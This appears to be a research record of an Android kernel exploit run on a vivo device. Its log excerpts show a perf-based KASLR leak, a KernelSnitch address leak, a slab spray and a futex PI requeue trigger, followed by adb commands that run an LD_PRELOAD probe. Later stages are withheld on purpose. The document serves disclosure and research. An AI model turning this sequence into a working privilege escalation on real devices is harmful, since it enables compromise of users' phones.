# 01. Empirical record and conclusion boundary

## Abstract

This file records empirical evidence up to the 3.1 endpoint and defines the public conclusion boundary. Every conclusion below is supported either by visible log evidence or by the current source boundary. Technical material after 3.1 is intentionally excluded.

## Material note

The reference run used a local trimmed artifact whose logs include `preload starting`, `direct-demo`, `startup context`, and `build config`. The current public source uses `probe loader`, `probe supervisor`, `probe context`, and `probe build`. This is a naming difference; the field-level evidence is read from the key/value logs.

| Reference log name | Current source name | Meaning |
| --- | --- | --- |
| `preload starting` | `probe loader starting` | `LD_PRELOAD` constructor entered |
| `direct-demo supervisor` | `probe supervisor` | supervisor started a worker |
| `direct-demo profile applied` | `probe profile applied` | target profile and defaults applied |
| `startup context` | `probe context` | shell identity and SELinux context |
| `build config` | `probe build` | build label and 3.1 observation path |

## Empirical excerpt

The following excerpt covers only observations at and before 3.1:

```text
[+] preload starting pid=23916
[*] direct-demo supervisor attempt=1/3
[+] direct-demo profile applied target=vivo_pd2314_mt6896z_5.10.233_sp_2026-05-01 defaults=28
[+] startup context pid=23917 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[+] build config pid=23917 label=pd2314_a_15_2_17_1_w10 slide=pselect main=pselect
[*] perf probe policy paranoid=-1
[*] perf probe open fd=3 errno=0 attr_size=136
[*] perf probe ring head=32752 tail=32752 records=2047 samples=2047 kernel=2047 lost=0 malformed=0
[*] perf probe sampled duration_ms=200 disable=0/0 min=ffffffe778d67770 max=ffffffe77ba02c5c
[*] perf probe candidate page=ffffffe779e00000 window=2044/2047 near=999 far=887 buckets=8
[+] perf probe text-base=ffffffe779e00000 min_kip=ffffffe778d67770 samples=2047
[+] slide-kaslr-perf-ok pid=23917 base=ffffffe779e00000 slide=0000002771e00000
[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] kernelsnitch collision-scan found=7/7 elapsed_ms=2220
[*] kernelsnitch collision-scan leaked mm=ffffff8165295640
[*] tcp payload geometry slab_base=ffffff8165290000 payload_base=ffffff8165290000 payload_bias=0xe80 fake_lock=ffffff8165291350 fake_w0=ffffff8165292220 fake_task=ffffff8165295800 fake_fops=ffffff8165291000
[+] final payload invariant ok mode=active-final target=ffffff8002c84ea8 value=ffffff8165291000
[*] af_unix order3 staged pairs=64 requested=64
[*] sk_buff pcp send ret=65536 errno=0
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
[*] main FUTEX_CMP_REQUEUE_PI ret=-1 errno=35
[*] slide ip enter fd=3 attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 target=x28+0x38 value=ffffff8165291370 final_fops=1 full_waiter=0 overlay=marker
[*] slide final tree parent=ffffff8002c84ea0 right=ffffff8165291000 left=0 pi_write=1
[*] slide ip seq=1 ret=-1 errno=22 calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
00002771e00000 route_done=1
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
```

## Conclusion table

| ID | Conclusion | Evidence | Boundary |
| --- | --- | --- | --- |
| C1 | The target process entered the observation path as shell | `uid=2000 euid=2000 attr=u:r:shell:s0 enforce=1` | no privilege-state claim |
| C2 | perf sampling was available in this run | `paranoid=-1`, `open fd=3 errno=0`, `kernel=2047 lost=0 malformed=0` | only this run's environment |
| C3 | KASLR text base was accepted by the voting window | `candidate page=... window=2044/2047`, `slide-kaslr-perf-ok` | address is not stable across boots |
| C4 | KernelSnitch/mm collision returned a usable address | `found=7/7`, `leaked mm=ffffff8165295640` | not proof that the payload was consumed by the kernel |
| C5 | user-space payload geometry was internally consistent | `final payload invariant ok` | not proof that the target slot was modified |
| C6 | spray count completed | `sent=4096 requested=4096` | not standalone hit proof |
| C7 | futex PI requeue and scheduler-side effect appeared | `errno=35`, `sched_ok=1` | no post-3.1 state claim |
| C8 | the 3.1 endpoint was reached | `route_done=1` | public conclusion ends here |

## Source boundary

The current public `refclone_run_probe()` includes an ashmem fops restoration attempt after `rc_run_main_route_threads()` and then prints `route-summary`. That is a source-level boundary statement. The public conclusion still rests on the 3.1 log evidence and does not promote later-stage material into this repository.

## Capture requirements

At minimum, keep:

```bash
adb logcat -b all -v threadtime > logcat-live.txt
adb shell 'Z_REFCLONE=1 LD_PRELOAD=/data/local/tmp/probe.so /system/bin/toybox id' 2>&1 | tee probe-console.txt
adb shell getprop ro.boot.bootreason
adb shell dmesg > dmesg-after.txt
```

Reboot, panic, watchdog, or long unresponsiveness are test risks accepted by the operator. Confirm device and data recoverability before testing.
